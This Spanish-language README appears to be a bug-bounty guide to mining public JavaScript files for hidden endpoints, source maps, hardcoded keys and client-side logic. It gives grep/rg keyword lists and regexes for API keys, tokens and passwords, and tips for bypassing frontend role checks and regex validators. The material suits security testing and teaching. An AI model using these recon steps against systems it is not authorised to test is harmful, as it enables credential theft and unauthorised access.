<h1 align="center"><img height="40" src="https://github.com/Aquiles369/iconos/blob/main/img/lobo1.gif"><img height="40" src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNWx4YTl1dW9scXlqZDk2cTdyY2VvcXQwMG40OGoxY25rZzV0MDZhcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/peSyJWjNTRfzaWh49M/giphy.gif">".js analisis"<img height="40" src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNWx4YTl1dW9scXlqZDk2cTdyY2VvcXQwMG40OGoxY25rZzV0MDZhcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/peSyJWjNTRfzaWh49M/giphy.gif"><img height="35" src="https://github.com/Aquiles369/iconos/blob/main/img/lobo1.gif"> </h1>	


<br>


<p align="center">
 <img  height="470rem" alt="GIF" src="https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExaGRxd2VjOWdjNm11bmJoa2ZlNGdwMGxpdmRuNmNkMHZ6am5sOHBreiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/jRf4JCqluUqIV8AfLm/giphy.gif"/>
</p>


<picture> <img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">  </picture>

 ### <picture> <img src = "https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExcDl3ZHMzbDdvc3Q4bnJtd3d0Y3BwNHNucGh5NG02MWcxNHpxdWp4aCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/njQOl2ZDhznxW60OBK/giphy.gif" width = 75px>  </picture> Analisis de archivos .js

<br>

 **Análisis de archivos .js. Proceso enfocado en revisar, mapear y comprender el código JavaScript de una aplicación para identificar vectores de ataque potenciales. Incluye la detección de funciones sensibles, endpoints ocultos, parámetros interesantes, lógica de validación, fugas de datos y posibles superficies para XSS, DOM Clobbering, prototipo pollution o bypass de seguridad.<br><br>
Objetivo: convertir cada archivo .js en una fuente de inteligencia útil durante la fase de recon y explotación, revelando rutas y comportamientos que no están expuestos directamente en la interfaz de la aplicación.** 
<br><br> 

<p align="center">
 <img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/iconos/blob/main/metodos_http_y_header_demo_1.gif"/>
</p>


<br>
<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
<br>


### <picture> <img src = "https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExaGY0OTR3bm96dnoyYXVmcG13dnduYXk3ZDI2NjhnNzN0bXM4NDM1YSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/fy6biuVnGGiZq9Tqwt/giphy.gif" width = 75px>  </picture> Problema que resuelve<br><br>
**Detecta fugas de información y superficies ocultas de ataque antes de que lo haga un atacante. Permite descubrir rutas internas, parámetros sensibles y lógica vulnerable que no está visible en la interfaz.** 

<br>

### <picture> <img src = "https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExMHVnZDh5OWl5Y3dzeTUzYWhqMTZ5NzRwbTZqMHIyNTJldnZiazR2MiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/K7Il3mkCCwggaGzExC/giphy.gif" width = 75px>  </picture> Qué aporta y cómo beneficia <br><br>
**• Permite descubrir endpoints no documentados o restringidos.<br><br>
  • Facilita encontrar parámetros vulnerables a XSS, IDOR, SSRF o RCE.<br><br>
  • Ayuda a identificar claves duras en el código (AWS, Firebase, API keys).<br><br>
  • Revela lógica de validación en el cliente que puede ser manipulada o saltada.<br><br>
  • Amplía el mapa de ataque incluso sin autenticación.** 

<br>
<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
<br>

### <picture> <img src = "https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExYWoxdW43NjQ5NjhocHF6NnA2MmQ4OHloZWEyc2R1M2t6Z3FkMWhsZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/iuJEr72fj83GJy4tJn/giphy.gif" width = 80px>  </picture> Resumen rápido
<br><br>

Los archivos JavaScript públicos suelen filtrar información sensible —endpoints ocultos, claves API, tokens, rutas internas o lógica de seguridad— que los desarrolladores dejan embebidos sin darse cuenta.  
Analizarlos permite descubrir superficies de ataque invisibles, explotar vulnerabilidades como **XSS, IDOR, SSRF o bypass de autenticación**, y acceder a recursos restringidos.<br>

En bug bounty, leer el `.js` es como mirar detrás del telón: ahí están los secretos que el frontend no debía mostrar.


<br>
<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
<br>

### <picture> <img src = "https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExb2gzOGF3Z2tqMWM3YzJ1ODE4aGhhaGgzbXlpbGMzbzBrMm40aDBrcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/5OJLBp60agyioEwpJf/giphy.gif" width = 80px>  </picture> Índice 
<br><br>

- [Tabla de CWE , CVE , CAPEC , RFCs , OWASP , NIST , ASVS , MITRE ATT&CK](#1)
- [ Checklist , análisis de archivos .js](#2)
- [ Investigación propia](#3)
- [ Dónde buscar funciones / ejemplos](#4)
- [ “Palabras claves y Dorks”](#5)
- [182 Informes diferentes](#6)
- [Hardening / mitigation](#7)
- [“Recursos img entre otros”](#8)
- [“Metodología Aquiles”](#9)   

 



<br>
<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
<br>


### <picture> <img src = "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExMnI0aTAwanZhZHc2aTFsYzNid294Y3c4cGpzZ214bDh0Zm9sMTdzaSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/djj4FGpee1d067eJID/giphy.gif" width = 80px>  </picture> CWE , CVE , CAPEC , RFCs , OWASP , NIST , ASVS , MITRE ATT&CK

#  1

**Los archivos .js y librerías cliente pueden introducir vectores de ejecución (XSS/Template Eval), exposición de secretos y contaminación del entorno (prototype pollution / supply-chain), que permiten desde robo de sesiones hasta ejecución remota y persistente en el navegador.**

<br><br>

• CWE: clasifica la falla técnica (ej. CWE-79 = XSS, CWE-95/94 = eval/code injection, CWE-1321 = prototype pollution). Sirve para nombrar la vulnerabilidad técnica en el informe.<br><br>

• CVE: casos reales explotables en librerías (ej. jQuery, lodash). Muestra ejemplos prácticos y versiones parcheadas; útil para compararlo con dependencias del target.<br><br>

• CAPEC: describe el patrón de ataque (p. ej. CAPEC-63 = XSS). Te ayuda a explicar la técnica al equipo de riesgos y priorizar mitigaciones.<br><br>

• RFCs: normas técnicas (HTTP, Same-Origin, Cookies, WebSocket, URIs) que definen la plataforma; explicar violaciones a nivel protocolo (CORS mal configurado, cookies sin HttpOnly).<br><br>

• OWASP / ASVS: guías y controles aplicables en la app (Top10 para prioridades; ASVS para requisitos verificables como “no usar eval” o CSP+SRI).<br><br>

• NIST: marco de procesos y controles (SSDF, SP800-53) para incorporar prevención en el ciclo de desarrollo y auditoría.<br><br>

• MITRE ATT&CK: mapea el impacto con tácticas/tecnicas del adversario (exfiltración, initial access, supply chain) para TI/blue team y reportes ejecutivos.

<br><br>


>  Usa esta tabla como como guia `analisis de archivos .js` :

| Estandares | Descripción |
|------|-------------|
| `CWE-79` | XSS / DOM XSS por neutralización insuficiente de input/output. Evitar innerHTML/document.write; validar y encodar salida. URL: https://cwe.mitre.org/data/definitions/79.html |
| `CWE-116` | Escape/encoding inadecuado que facilita XSS y otras inyecciones. Aplicar encoding contextual (HTML/JS/URL). URL: https://cwe.mitre.org/data/definitions/116.html |
| `CWE-95` | Eval Injection — uso de eval/new Function con datos no confiables → ejecución de código. Eliminar evaluadores dinámicos. URL: https://cwe.mitre.org/data/definitions/95.html |
| `CWE-94` | Improper Control of Generation of Code — generación dinámica de código desde entrada no controlada. Validar y sanear fuertemente. URL: https://cwe.mitre.org/data/definitions/94.html |
| `CWE-829` | Inclusión de funcionalidad desde fuentes no confiables (CDN/scripts comprometidos). Usar SRI, CSP y auditar dependencias. URL: https://cwe.mitre.org/data/definitions/829.html |
| `CWE-798` | Credenciales / keys hardcodeadas en JS/frontend. No almacenar secretos en el cliente; usar vault/servidor. URL: https://cwe.mitre.org/data/definitions/798.html |
| `CWE-312 / CWE-200 / CWE-215` | Exposición de información sensible (localStorage, logs, comentarios, respuestas). Evitar almacenar/mostrar secretos; revisar mensajes de error. URL: https://cwe.mitre.org/ |
| `CWE-1321` | Prototype Pollution en objetos JS (modificación de __proto__ / merges inseguros). Validar keys; evitar merges recursivos inseguros. URL: https://cwe.mitre.org/data/definitions/1321.html |
| `CVE-2020-11022` | jQuery — XSS vía ciertos métodos DOM; ejemplo de patrón a detectar. Actualizar jQuery. URL: https://nvd.nist.gov/vuln/detail/CVE-2020-11022 |
| `CVE-2020-11023` | jQuery — XSS relacionado con <option> al insertar HTML. Parchear y sanitizar inputs. URL: https://nvd.nist.gov/vuln/detail/CVE-2020-11023 |
| `CVE-2021-23337` | lodash _.template — inyección/ejecución si se procesan plantillas sin control. Actualizar lodash. URL: https://nvd.nist.gov/vuln/detail/CVE-2021-23337 |
| `CAPEC-63` | Cross-Site Scripting — patrón general (incluye DOM XSS). Identificar sinks (innerHTML, insertAdjacentHTML, document.write) y aplicar sanitización/encoding. URL: https://capec.mitre.org/data/definitions/63.html |
| `CAPEC-242` | Code Injection — vectores eval/Function/plantillas que generan código. Eliminar evaluadores dinámicos o aplicar whitelists. URL: https://capec.mitre.org/data/definitions/242.html |
| `CAPEC-591 / CAPEC-592` | Reflected / Stored XSS — clasificación práctica para reportes y priorización de explotabilidad. URL: https://capec.mitre.org/ |
| `RFC 9110` | HTTP Semantics — cabeceras y comportamientos HTTP que afectan parseo, caché y seguridad de recursos usados por JS. Revisar Content-Type, Cache-Control, Vary. URL: https://www.rfc-editor.org/rfc/rfc9110.html |
| `RFC 6454` | The Web Origin Concept — base de Same-Origin Policy; clave para postMessage, CORS y separación de orígenes en JS. URL: https://www.rfc-editor.org/rfc/rfc6454.html |
| `RFC 3986` | URI Syntax — normalización/validación de URIs; importante al construir URLs en JS y discovery de endpoints. URL: https://www.rfc-editor.org/rfc/rfc3986.html |
| `RFC 6455` | WebSocket — handshake / Origin header; revisar usos de WS desde código cliente y validar Origin. URL: https://www.rfc-editor.org/rfc/rfc6455.html |
| `OWASP Top 10 (2021)` | A03 Injection (XSS mapeado aquí). Usar Top10 como checklist de riesgos prioritarios y guía de mitigaciones. URL: https://owasp.org/Top10/ |
| `NIST SP 800-218 (SSDF)` | Secure Software Development Framework — integrar prácticas de ciclo de vida: SCA, SAST, evitar eval, revisar dependencias JS en CI/CD. URL: https://csrc.nist.gov/pubs/sp/800/218/final |
| `NIST SP 800-53 Rev.5` | Controles aplicables (ej. SI-10 Input Validation) útiles para mapear requisitos y controles de validación/mitigación. URL: https://csrc.nist.gov/pubs/sp/800/53/r5/final |
| `NIST SP 800-53 Rev.5` | Controles aplicables (ej. SI-10 Input Validation) útiles para mapear requisitos y controles de validación/mitigación. URL: https://csrc.nist.gov/pubs/sp/800/53/r5/final |
| `ASVS v4 / v5 — V5` | Validation, Sanitization & Encoding — encode salida y validar entradas usadas por JS/DOM. URL: https://owasp.org/www-project-application-security-verification-standard/ |
| `ASVS v4 / v5 — V10` | Malicious Code — prohibir eval, Function, setTimeout(string) y bibliotecas no confiables; validar dependencias. URL: https://owasp.org/www-project-application-security-verification-standard/ |
| `ASVS v4 / v5 — V14` | Config — CSP estricta y SRI (Subresource Integrity) para <script> externos; políticas de carga de recursos. URL: https://owasp.org/www-project-application-security-verification-standard/ |
| `MITRE ATT&CK — T1190` | Exploit Public-Facing Application — si el JS vulnerable está expuesto públicamente puede ser vector de acceso inicial. URL: https://attack.mitre.org/techniques/T1190/ |
| `MITRE ATT&CK — T1552` | Unsecured Credentials — credenciales expuestas en JS → exfiltración/uso. Escaneo de secretos y rotación. URL: https://attack.mitre.org/techniques/T1552/ |
| `MITRE ATT&CK — T1027` | Obfuscated Files & Info — ofuscación/packing de JS (mal uso o supply-chain). Analizar ofuscación y comprobar integridad. URL: https://attack.mitre.org/techniques/T1027/ |
| `MITRE ATT&CK — T1195` | Supply Chain Compromise — dependencias NPM/CDN comprometidas inyectan código en bundles finales. Auditar dependencias y pinear versiones. URL: https://attack.mitre.org/techniques/T1195/ |


<br>
<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
<br>



### <picture> <img src = "https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExc255bzh6OWZqdGI1eW54eGFiYjg1ZGt6cjJ5YzA5MDMwZzV2YjM0byZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/3uKw2QfFkJ6zyvD5cU/giphy.gif" width = 80px>  </picture>  Checklist , análisis de archivos .js
<br><br>

#  2



```yaml
1. Enumeración completa de archivos JS

•  Prueba clave:

Localizá todos los .js cargados por la app:

Con DevTools → pestaña Network (.js)

Con herramientas:

katana -u https://target.com -jc

subjs, linkfinder, JSFinder



Interpretación:

🟢 Solo librerías externas →  superficie mínima.

🟡 Archivos internos pero minificados →  potencial oculto.

🔴 JS internos no minificados →  info sensible accesible.

 Pro tip: buscá también .map (source maps), a veces revelan el código fuente completo sin minificar.




2. Búsqueda de endpoints y rutas internas

•  Prueba clave:

Extraé URLs, paths y dominios embebidos:

/api/v1/users
https://internal.api.target.com
https://s3.amazonaws.com/target-bucket


Usá grep -Eo "https?://[^\"']+" *.js o linkfinder.py.

Interpretación:

🟢 Solo endpoints públicos conocidos →  controlado.

🟡 Endpoints no documentados →  recon útil.

🔴 Rutas internas o admin →  expansión de superficie.



3. Búsqueda de secretos, claves y tokens

•  Prueba clave:

Buscá patrones comunes:

api_key
access_token
secret
Bearer
Basic


Regex pro:

[A-Za-z0-9_\-]{20,40}
AIza[0-9A-Za-z\-_]{35}


Interpretación:

🟢 Nada sensible →  limpio.

🟡 Tokens revocados →  leak informativo.

🔴 Claves válidas →  explotación directa (SSRF, RCE, admin takeover).

En bug bounties reales, se han conseguido RCE en AWS Lambda con una simple key filtrada en un .js.




4. Detección de parámetros, query keys y payload sinks

•  Prueba clave:

Identificá parámetros usados en requests JS:

fetch("/api/user?id="+userId)
xhr.open("GET", "/details?item="+item)


Interpretación:

🟢 Parámetros internos sin control del usuario →  seguro.

🟡 Parámetros parcialmente controlables →  probar inyección.

🔴 Parámetros 100% controlados por el usuario →  vector XSS, IDOR o inyección.

Cada parámetro en un .js = posible punto de entrada. Combínalo con fuzzers o payloads manuales.





5. Identificación de sinks peligrosos y funciones críticas

•  Prueba clave:

Buscá funciones que ejecutan o insertan contenido:

innerHTML
outerHTML
eval(
Function(
document.write(
setTimeout("...


Interpretación:

🟢 No se usan sinks peligrosos →  superficie limitada.

🟡 Sinks presentes pero con sanitización →  necesita bypass.

🔴 Sinks con input del usuario →  DOM XSS o RCE inminente.

Esto convierte un simple parámetro reflejado en XSS funcional sin tocar el backend.





6. Análisis de lógica interna y bypasses potenciales

•  Prueba clave:

Leé la lógica de funciones sensibles:

Validaciones (if (role === 'admin'))

Flags (debug=true)

Checks ocultos (if(!isVerified))

Interpretación:

🟢 Lógica clara y robusta →  bien estructurado.

🟡 Validaciones solo en frontend →  bypass fácil.

🔴 Acciones críticas sin verificación →  abuso directo.

Muchas apps validan roles solo en el JS → podés cambiar user por admin desde la consola y acceder a paneles protegidos





7. Revisión de dependencias vulnerables

•  Prueba clave:

Buscá versiones de librerías:

<script src="https://cdn.jsdelivr.net/npm/jquery@1.8.3"></script>


Chequeá CVEs con npm audit o Snyk
.

Interpretación:

🟢 Todas actualizadas →  bajo riesgo.

🟡 Algunas obsoletas →  potencial encadenamiento.

🔴 Librerías con CVEs conocidas →  vector de entrada directo.

jQuery < 3.5.0 = XSS autoejecutable en muchos casos.





8. Verificación de mapas fuente (.map)

•  Prueba clave:

Intentá acceder a *.js.map:

https://target.com/js/main.js.map


Interpretación:

🟢 No existe o inaccesible →  bien configurado.

🟡 Existe pero minificado →  recon útil.

🔴 Código fuente completo expuesto →  mapa completo de la app.

- Un .map filtrado es equivalente a leer el repositorio original 

• Resultado final, cómo interpretarlo


• Estado final	Significado
🟢 Todos verdes	 Análisis de JS sin hallazgos.
🟡 Alguno amarillo  superficie abierta, vale la pena profundizar.
🔴 Cualquiera rojo	 JS vulnerable o con info crítica filtrada.

•  Pro tip Myrmidón:
El análisis de JS suele ser el paso más infravalorado… pero el más rentable. Así nacen muchas cadenas:

JS con endpoints → SSRF / IDOR

JS con claves → acceso a APIs internas

JS con sinks → DOM XSS

JS con lógica → bypass de roles

JS con rutas → LFI o RFI interno


- Ejemplo real (impacto crítico):

Archivo main.js:

fetch("/api/admin/delete?user=" + userId);

```

<br>
<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
<br>

### <picture> <img src = "https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNW9qZDE2NG00dmdxMzBvbzJmOHJycnplYWZwZmNrZTdpcTVyNXM5biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/eyjs7st5OcMXSw7mjV/giphy.gif" width = 80px>  </picture> Investigación propia

#  3

**En esta sección se encuentra un breve resumen de la investigación que realicé, de la cual aprendí mucho conocimiento que desconocía anteriormente y quiero compartirlo, ya que me ayudó a comprender mucho mejor y tener una base sólida para poder leer luego los 200 informes de análisis de JavaScript y entenderlos más rápido.
Además, me permitió identificar en qué áreas me faltaba más conocimiento o debía repasar.<br>
La parte relacionada con herramientas y sitios web la dejaré en la sección de informes, y todo lo que aprendí leyendo esos 200 informes lo dividiré en tres categorías: texto, tips/consejos y herramientas (tools).**<br><br>



## Tipo de map y riesgo

inline = map embebido en JS → expone todo si el JS está público.

separate + sourceMappingURL = si .map se sube, igual expone.

nosources = menos riesgo (no incluye sourcesContent), pero aun así revela rutas y estructura.


<br><br>

## Extraer sources y sourcesContent:

jq -r '.sources[]' app.min.js.map
jq -r '.sourcesContent | length' app.min.js.map  # si existe mostrará >0
jq -r '.sourcesContent[]' app.min.js.map > combined_sources.js



<br><br>

## Metodología: 

katana -u target.com -jc

subjs, linkfinder, JSFinder 

Analizá los endpoints activos con httpx, ffuf scar msa enpdio etc rutas, o tu propio script.

<br><br>



## ¿Qué necesitas extra?:

source-map-explorer — te ayuda cuando tienes .map.

esprima/acorn/recast — para AST.

js-beautify, terser — para formatting.

strings, ripgrep, grep — para extracción rápida.

<br><br>




## Consejos para trabajar con sourcemaps (versión corregida y directa):

• Lo más importante suele estar en los JS minificados: embellecé el código primero.

• Si está ofuscado, usá herramientas de desofuscación web antes de analizarlo.

• Empezá con herramientas automatizadas para obtener una visión rápida.

• Después aplicá tus propios diccionarios de búsqueda por categoría (keywords) y tus reglas regex personalizadas.

• Finalmente, analizá el código con herramientas más profundas como jsluice para un examen exhaustivo.

• Podés crear configuraciones por defecto (presets) que busquen bloques de código, funciones y patrones específicos: eso acelera y afina la detección.

• sourceMap es oro pero no siempre está disponible; cuando lo está, priorizarlo antes de invertir horas en parsing manual.

• Si ves escape() o encodeURIComponent() en JS, la app hace encoding client-side — prueba encoded variants.

• Buscar sourcer.map archiv js compelto sin minificar-

• En bundles/minificados complejos va a faltar recuperar rutas construidas por funciones/variables que no están en el mismo archivo: tu heurística de concat/backticks ayuda, pero habrá falsos negativos cuando el string venga de un const importado o generado en runtime.

• Los hashes iguales no siempre implican idéntico comportamiento (puede cambiar contenido por timestamp): confirmá también Content-Length, primeros N bytes o diffs parciales si buscas reutilización masiva.

• Cuando automatizas búsquedas por permutaciones: cuidado con el ruido (falsos positivos) — conviene cruzar con patrones de llamadas HTTP detectadas (axios.post, fetch(url, {method:'POST'})) para subir la señal.


• En archivos minificados o empaquetados (.bundle.js), también se encuentran en formato sin espacios:

• Priorizar: /api/v1/*, /v[0-9]+/*, prefijos internal|admin|svc|service|api|auth|accounts. Generá permutaciones con esos prefijos.

• Para encontrar parámetros ocultos: busca patrones \?[^'"]+ y luego descomponé por & para ver keys repetidas (id, userId, uid, user_id).

• Extraé todas las strings con posibles rutas:
grep -Eo "(\/[a-zA-Z0-9_\-\/]+)" *.js > routes_raw.txt

• Regex útiles para ripgrep / rg
Extraer strings que parecen rutas:
rg -o "(\/[A-Za-z0-9_\-\/\{\}:]+(\?[^\s'\"()]*)?)" path/


• Detectar llamadas HTTP y métodos:

rg -n "(fetch\(|axios\.[a-zA-Z]+|XMLHttpRequest|\.ajax\()" path/
rg -o "method\s*:\s*['\"](GET|POST|PUT|DELETE|PATCH)['\"]" path/


• CDNs / hosts:

rg -o "https?:\/\/[A-Za-z0-9\.\-]+" path/ | awk -F/ '{print $3}' | sort -u


<br><br>



## Consejos en caso de encontrar una o varias reglas regex al analizar el código JavaScript::

• Los mensajes de error y variables pueden estar en cualquier idioma (spanish: inválido, formato inválido), así que incluye variantes en búsquedas.
Copiás la regex que encontraste en el .js o HTML (o la construís con new RegExp(...)).

• Seleccionás el flavor correcto (ECMAScript para JS).

• Pegás ejemplos reales (requests/responses) y probás variantes codificadas (%00, %0a), unicode escapes (\uXXXX) y truncations.

• Usá el explainer y el debugger para ver por qué la regex acepta/rechaza una variante — así sabes exactamente qué manipular para bypass.

• Cuando confirmás un bypass en regex101, lo reproducís contra el servidor (curl/Burp) sin JS.

• Regla práctica: si auditas frontend/JS → seleccioná ECMAScript en regex101; si auditas backend PHP → PCRE; Python → Python.

• Señales que indican validaciones por regex / allowlist / normalización

• Busca estas pistas en el cliente y en el servidor:

• En el front (rápido y efectivo)

• pattern="..." en inputs HTML (<input pattern="...">). Eso casi siempre acompaña una validación regex.

• Mensajes de error claros: “Formato inválido”, “Solo caracteres alfanuméricos permitidos”, “Invalid email” → suelen provenir de validadores.

• Código JS expuesto que contenga RegExp, .match(, .test(, .replace( con regex, o funciones que usan new RegExp(...).

• Formularios que bloquean envío en el navegador (oninput / onsubmit handlers que previenen submit).

• Comandos útiles para detectar rápidamente JS que use regex:

• En el servidor / comportamiento HTTP

• Respuestas distintas con caracteres especiales: si al mandar <> o %00 recibís un error diferente, hay normalización o filtrado.

• Respuestas iguales pero el backend trunca datos (longitudes máximas).

• Mensajes de validación en body (400/422 con mensaje textual).

• Redirecciones/bloqueos condicionales cuando cambias el caso (Admin vs admin) → case folding.

• Técnica rápida para comprobar: manda la misma entrada variada (caracteres especiales, codificados, truncados) y compara respuestas (status, longitud, location header, body). Si hay diferencias, hay validación/normalización.

<br><br>



## Análisis de lógica interna con IA:


•  Prueba clave:

Leé la lógica de funciones sensibles:

Validaciones (if (role === 'admin'))

Flags (debug=true)

Checks ocultos (if(!isVerified))


Revisión de dependencias vulnerables


<br><br>


•  Prueba clave:

Buscá versiones de librerías crea lsita de las biblotecas librerias mas utizlai como tambine framow erc front etc:

<script src="https://cdn.jsdelivr.net/npm/jquery@1.8.3"></script>


Chequeá CVEs con npm audit o Snyk

<br><br>




## Vulnerabilidades relacionadas que deberías buscar al analizar código JavaScript:

• Open redirect.

• XSS (priorizar stored/DOM XSS; céntrate en DOM).

• Inyección de plantillas.

• Prototype pollution / manipulación de prototype vía parámetros.

• IDOR (Insecure Direct Object References).

• Lógica empresarial insegura: analizar el flujo y las decisiones en el código JS.

• Funciones ocultas (debug, endpoints no documentados).

• API keys, tokens, rutas ocultas, paths y nuevos subdominios.

• Bypass de autenticación y autorización etc.

• Cors

• RCE (cuando el JS desencadena ejecución de código en el servidor o en contextos peligrosos).

<br><br>

Céntrate en entender cómo funciona el código JavaScript para mapear la infraestructura y cómo piensa el desarrollador: busca patrones, rutas, validaciones incompletas y suposiciones lógicas que puedan convertirse en vectores de ataque. Si creés que se pueden añadir otras vulnerabilidades relacionadas con el análisis de JS, incluilas: todo lo que ayude a enriquecer el informe y el mapeo.

<br><br>

**Recordatorio: todo lo anterior debe aplicarse tanto a archivos estáticos como dinámicos, y en contextos sin autenticación y post-autenticación puedes usar Burp Suite para capturar todo el tráfico mientras navegas por el sitio.
Limita el scope al objetivo para que en el historial de Burp solo aparezcan las requests del target. Cuando captures archivos dinámicos, configura correctamente las opciones de la extensión de captura para incluir los tipos de recurso que te interesan.<br><br>
• Revisá archivos estáticos (HTML, JS, CSS, assets) y dinámicos (endpoints, plantillas, APIs).<br><br>
• Probá escenarios sin sesión y con sesión (usuarios normales y privilegiados).<br><br>
• Documentá diferencias de comportamiento y vectores específicos por contexto.**



<br>
<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
<br>

### <picture> <img src = "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExMnI0aTAwanZhZHc2aTFsYzNid294Y3c4cGpzZ214bDh0Zm9sMTdzaSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/djj4FGpee1d067eJID/giphy.gif" width = 80px>  </picture> Dónde buscar funciones / ejemplos

#  4

**Sección: Dónde buscar el sourcemap y qué pasos seguir después**

<br><br>



- Encontrar el sourceMappingURL rápido (desde la web)

Abrí DevTools > Network > filtrar por JS, o abrí la URL del .js en el navegador y buscá al final: //# sourceMappingURL=...<br><br>

Línea de comando (si ya tenés la URL del .js):<br><br>

curl -s https://example.com/static/app.min.js | tail -n 10<br><br>
<br><br>


- Busca sourceMappingURL= en la salida.

Descargar los archivos (si el sourceMappingURL es una URL)<br><br>

curl -LO https://example.com/static/app.min.js <br><br>
curl -LO https://example.com/static/app.min.js.map<br><br>


Si la segunda devuelve 404, a veces el mapa está con otro nombre o no está expuesto.<br><br>

Extraer y guardar el source map si está inline (data:application/json;base64,...)<br><br>


<br><br>

# descarga el .js primero
curl -s https://example.com/static/app.min.js -o app.min.js<br><br>

<br><br>
# extrae la parte base64 y decodifica
tail -n 10 app.min.js | sed -n 's/.*base64,//p' | tr -d '\r\n' | base64 -d > app.min.js.map<br><br>


Si no aparece en tail, probá con grep -Po 'sourceMappingURL=.*' app.min.js.<br><br>

Ver qué archivos originales contiene el .map (rápido)<br><br>

jq '.sources' app.min.js.map<br><br>


Eso te muestra rutas/nombres de archivos originales, pistas directas de estructura del repo.<br><br>

Abrir en la herramienta de visualización (tu URL)<br><br>

Ir a https://sokra.github.io/source-map-visualization/<br><br>

Arrastrar y soltar app.min.js y app.min.js.map o pegar las URLs.<br><br>

Panel izquierdo: generated; derecho: original; abajo: mappings. Pasá el cursor por los bloques para ver correspondencias.<br><br>

Buscar secretos y endpoints manualmente (comandos rápidos)<br><br>

<br><br>

## buscar claves y palabras sensibles en el código original ya mapeado
rg -n --hidden -S 'apiKey|api_key|apikey|token|secret|passwd|password|clientId|accessKey|aws_access_key|private' path/to/originals/<br><br>
<br><br>

## si solo tenés app.min.js y app.min.js.map, podés buscar en el map por strings expuestos
rg -n 'apiKey|token|secret|password|clientId|endpoint|internal' app.min.js app.min.js.map<br><br>

Si no tenés rg, usá grep -RInE 'apiKey|token|secret|password|clientId|endpoint' .<br><br>

Opciones rápidas para entender el bundle<br><br>

Ver qué archivos pesan más (ayuda a saber dónde buscar):<br><br>

npx source-map-explorer app.min.js app.min.js.map<br><br>


Pretty-print en DevTools: abrí el .js en Sources y hacé clic en "{}" para formatear; si el source map está activo, verás las fuentes originales.<br><br>

Qué mirar primero (prioridad bug bounty)<br><br>

Nombres y rutas originales que contengan "config", "secret", "env", "credentials".<br><br>

Endpoints internos, URLs hacia APIs privadas, dominios internos.<br><br>

Comentarios TODO, FIXME, credenciales en texto plano.<br><br>

Uso de eval, new Function, innerHTML, document.write o concatenaciones peligrosas que formen URLs.<br><br>

Cualquier referencia a keys de terceros (Stripe, Firebase, AWS, etc).<br><br>
<br><br>


## Extra: <br><br>

Localizar referencias al sourcemap:

Busca comentarios //# sourceMappingURL= al final de los .js minificados.

Revisa el HTML y los <script> inyectados que cargan los bundles.

Mira la pestaña Network (filtro .map) mientras navegas.

Comprueba el servidor CDN / S3 / assets del deploy y robots.txt o index files (a veces quedan accesibles).

Buscar en repositorios públicos

Revisa GitHub/GitLab/Bitbucket, raw URLs y ramas main/release.

Prueba dorks en GitHub: filename:*.map org:target y extension:map.

Comprueba paquetes publicados (npm, CDN) si la app usa libs públicas.

Descargar y validar el sourcemap

Descargá el .map y los sourcesContent si están embebidos; si no, obtén las rutas a los archivos originales.

Verificá que el sourcemap no esté truncado o gzip/encoded.

Reconstruir/relacionar fuentes

Usá una herramienta para reconstruir los archivos originales (source-map tool, source-map npm, sourcemap-explorer).

Si faltan sourcesContent, descargá las rutas apuntadas por el .map.

Embellecer y desofuscar

Beautify/Prettify los archivos originales; si están ofuscados, aplicá desofuscadores automáticos primero.

Luego pasá herramientas de análisis estático (rg/rgx, jsluice, semgrep, etc.).

Automatizar búsquedas y reglas

Ejecutá búsquedas automáticas con tus diccionarios por categoría (API keys, tokens, endpoints, debug flags).

Aplicá tus reglas regex personalizadas para extraer patrones repetidos y rutas sensibles.

Análisis manual profundo

Mapear flujos críticos: autenticación, autorizaciones, validaciones y puntos donde el cliente confía en la lógica.

Buscar funciones debug/console.log que revelen rutas o tokens.

Identificar plantillas, dinámicas de generación de subdominios o creación de rutas.


<br>
